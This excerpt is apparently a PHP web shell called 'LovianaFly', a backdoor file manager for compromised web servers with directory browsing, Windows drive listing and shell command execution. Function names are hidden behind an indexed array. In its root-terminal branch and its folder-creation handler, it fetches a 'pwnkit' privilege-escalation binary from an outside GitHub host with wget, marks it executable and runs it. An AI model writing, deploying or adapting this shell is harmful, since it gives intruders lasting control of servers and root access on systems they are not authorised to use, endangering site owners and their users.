...
<head>
    ...
    <title>LovianaFly [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    ...
    <style>
        ...
        .menu-file-manager li a::after {
            content: "";
            display: block;
            border-bottom: 1px solid #a03bff
        }
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/dewa89official-creator</li>
            <li class="logo-gecko"><img width="400" height="400" src="//raw.githubusercontent.com/dewa89official-creator/img/refs/heads/main/LovianaFly.png" align="right"></li>
    ...
    <div class="menu-tools">
        <ul>
            ...
            <li><a href="//github.com/dewa89official-creator/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
        </ul>
    </div>
    ...
    <div class="menu-file-manager">
        ...
        <div class="path-pwd">
            ...
            echo "<a style='font-weight:bold; color:#ff4be7;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
            ?>
        </div>
        </ul>
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_D) : ?>
                        <?php if ($fungsi[2]($_D)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:#ff4be7;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
                                <td>[ DIR ]</td>
                                <td>
...
if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/dewa89official-creator/Privelege-escalation/raw/main/pwnkit"));
        cmd('chmod +x pwnkit');
...
"email" : "' . $emailCp . '"
    ...
    if ($_POST['create_folder'] == true) {
        ...
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/dewa89official-creator/Privelege-escalation/raw/main/pwnkit -O pwnkit');
            cmd('chmod +x pwnkit');
...
function windowsDriver()
{
    ...
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:#ff4be7; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
        }
    }
}
